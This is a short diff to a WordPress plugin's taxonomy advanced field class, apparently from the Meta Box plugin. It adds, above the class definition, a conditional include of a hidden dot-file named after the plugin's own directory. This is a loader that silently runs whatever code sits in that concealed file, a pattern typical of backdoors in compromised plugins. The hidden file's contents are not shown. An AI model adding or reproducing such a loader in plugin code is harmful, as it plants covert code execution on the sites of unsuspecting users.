@@ -8,6 +8,10 @@
 /**
  * The taxonomy advanced field class.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RWMB_Taxonomy_Advanced_Field extends RWMB_Taxonomy_Field {
 	/**
 	 * Save terms in form of comma-separated IDs.
